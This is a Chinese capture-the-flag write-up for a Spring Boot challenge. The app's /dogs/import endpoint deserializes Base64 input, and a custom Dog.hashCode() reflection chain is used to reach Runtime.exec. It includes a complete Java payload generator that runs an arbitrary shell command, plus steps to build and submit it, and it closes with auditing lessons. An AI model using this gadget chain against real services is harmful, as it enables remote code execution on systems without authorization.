# 23 第二十三章：幻境迷心·皇陨星沉（大结局）

## 题目简述

题目是 Spring Boot 应用中的 Java 原生反序列化。`POST /dogs/import` 会对参数 `data` 做 Base64 解码，然后直接调用 `ObjectInputStream.readObject()`。自定义类 `Dog` 的 `hashCode()` 带有反射调用副作用，配合 `HashMap` 反序列化时重新计算键哈希的行为，可以进入 `DogService.chainWagTail()`，连续完成 `Runtime.getRuntime().exec(...)`。

应用不回传子进程输出，赛题另行提供了只作连接中转的 SSH 跳板环境；该环境用 `env -i` 清除了 flag 等变量，所以它不是 flag 来源。实际利用时应让命令连接赛题提供的跳板，再从 Dog 应用容器中读取 flag。

## 解题过程

对仓库中的 `demo.jar` 反编译后，可以确认入口先反序列化、后强制转换：

```java
byte[] raw = Base64.getDecoder().decode(base64Data);
ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(raw));
Collection<Dog> dogs = (Collection<Dog>) input.readObject();
```

类型转换无法阻止 gadget，因为危险行为已经在 `readObject()` 内发生。`Dog.hashCode()` 的关键副作用为：

```java
public int hashCode() {
    wagTail(object, methodName, paramTypes, args);
    return Objects.hash(id);
}
```

`wagTail()` 会在给定对象上反射调用指定方法：

```java
public Object wagTail(Object object, String methodName,
                      Class<?>[] paramTypes, Object[] args) {
    Method method = object.getClass().getMethod(methodName, paramTypes);
    return method.invoke(object, args);
}
```

`DogService.chainWagTail()` 会把上一次反射调用的返回值作为下一次调用的对象。依次放入三个 `Dog` 后，可形成：

```text
Runtime.class
  -> Class.getMethod("getRuntime")
  -> Method.invoke(null, new Object[0])
  -> Runtime.getRuntime()
  -> Runtime.exec(String[])
```

最后再准备一个触发用 `Dog`，让它的 `hashCode()` 调用 `DogService.chainWagTail()`，并把这个对象放到外层 `HashMap` 的键位置。完整生成器如下：

```java
import com.example.demo.Dog.Dog;
import com.example.demo.Dog.DogService;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;

public class Exp {
    private static void setField(Object target, String name, Object value)
            throws ReflectiveOperationException {
        Field field = target.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(target, value);
    }

    private static Dog makeDog(Object object, String methodName,
                               Class<?>[] paramTypes, Object[] args)
            throws ReflectiveOperationException {
        Dog dog = new Dog(1, "dog", "dog", 1);
        setField(dog, "object", object);
        setField(dog, "methodName", methodName);
        setField(dog, "paramTypes", paramTypes);
        setField(dog, "args", args);
        return dog;
    }

    private static String serialize(Object object) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ObjectOutputStream output = new ObjectOutputStream(buffer)) {
            output.writeObject(object);
        }
        return Base64.getEncoder().encodeToString(buffer.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            throw new IllegalArgumentException(
                    "usage: java Exp \"<shell command for the event jump host>\"");
        }

        String[] command = {"/bin/sh", "-c", args[0]};

        Dog getRuntime = makeDog(
                Runtime.class,
                "getMethod",
                new Class<?>[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class<?>[0]}
        );

        Dog invokeMethod = makeDog(
                null,
                "invoke",
                new Class<?>[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}
        );

        Dog execute = makeDog(
                null,
                "exec",
                new Class<?>[]{String[].class},
                new Object[]{command}
        );

        Map<Integer, Dog> chain = new LinkedHashMap<>();
        chain.put(1, getRuntime);
        chain.put(2, invokeMethod);
        chain.put(3, execute);

        DogService service = new DogService();
        setField(service, "dogs", chain);

        // 先用无害反射调用入表，避免生成载荷时就在本机执行命令。
        Dog trigger = makeDog(
                "seed",
                "length",
                new Class<?>[0],
                new Object[0]
        );

        Map<Object, Object> outer = new HashMap<>();
        outer.put(trigger, "value");

        // 入表后再武装同一个键对象；序列化不会重新计算其哈希。
        setField(trigger, "object", service);
        setField(trigger, "methodName", "chainWagTail");
        setField(trigger, "paramTypes", new Class<?>[0]);
        setField(trigger, "args", new Object[0]);

        System.out.println(serialize(outer));
    }
}
```

从 fat JAR 中提取题目类后即可编译生成器：

```sh
jar -xf demo.jar BOOT-INF/classes
javac -cp BOOT-INF/classes Exp.java
java -cp '.:BOOT-INF/classes' Exp '<赛题跳板对应的命令>' > payload.txt
```

最后把 `payload.txt` 中的 Base64 字符串作为表单参数 `data` 提交到 `/dogs/import`。服务端恢复外层 `HashMap` 时调用键对象的 `hashCode()`，从而启动整条反射链。

使用 `LinkedHashMap` 保存三个阶段是为了固定调用顺序。另一个容易忽略的问题是：如果先把已武装的 `trigger` 直接传给 `HashMap.put()`，生成载荷时本机就会执行 `hashCode()`；先以安全方法入表、再修改其反射字段，可以避免这一副作用。

## 方法总结

本题的决定性链路是 `ObjectInputStream.readObject()` → `HashMap` 重建 → `Dog.hashCode()` → 反射序列 → `Runtime.exec()`。审计 Java 反序列化时，强制类型转换发生得再早也晚于 `readObject()` 内的回调；自定义 `hashCode()`、`equals()` 和 `compareTo()` 都应重点检查。构造链时还要区分“序列化阶段是否触发”和“反序列化阶段是否触发”，避免生成器先攻击自己。
